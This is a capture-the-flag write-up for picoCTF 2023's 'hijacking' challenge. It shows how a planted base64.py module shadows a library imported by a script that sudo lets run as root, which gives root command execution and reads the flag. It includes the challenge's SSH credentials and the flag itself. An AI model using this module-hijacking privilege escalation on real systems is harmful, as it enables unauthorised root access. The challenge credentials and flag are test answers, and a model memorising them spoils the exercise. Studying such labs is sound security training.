# picoCTF 2023 - hijacking (Binary Exploitation)

## Description 

Getting root access can allow you to read the flag. Luckily there is a python file that you might like to play with.

Through Social engineering, we've got the credentials to use on the server. SSH is running on the server.

saturn.picoctf.net 52795
Username: picoctf
Password: EVf4z1Lz73

## Solution 

Hinted by the name and the python file with owned by root, this is a python library hijacking problem. 
After sshed to the server, we see that a hidden file that imported some packages. 
I decided to hijack the `base64` library. 

I created a file called `base64.py` in the same directory as the python file with the following content. 
As python will look for packages in the current directory first, my `base64.py` will be used when imported. 

```python 
import os
print("hijacked") 
os.system("whoami")
```

Using `python3 .server.py`, I got 
```
hijacked 
picoctf 
... ...
```
This is not what we want. 
Using `sudo -l`, we got 
```
Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
    (ALL) /usr/bin/vi
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
```
We see that `/usr/bin/python3` does not require password to run as root. 
Thus, I tried `sudo /usr/bin/python3 /home/picoctf/.server.py` and I got 
```
hijacked
root
... ...
```
Now, we basically have a shell with root privilege.
I found that the folder `/challenge` is owned by root and I don't have access. 
I added a line `os.system("ls -r /challenge")` to `base64.py` and I saw a `metadata.json` file. 
Then, I added a line `os.system("cat /challenge/metadata.json")` again and this is the result. 
```
hijacked
root
metadata.json
{"flag": "picoCTF{pYth0nn_libraryH!j@CK!n9_5a7b5866}", "username": "picoctf", "password": "EVf4z1Lz73"}
... ...
```

## Flag 

`picoCTF{pYth0nn_libraryH!j@CK!n9_5a7b5866}`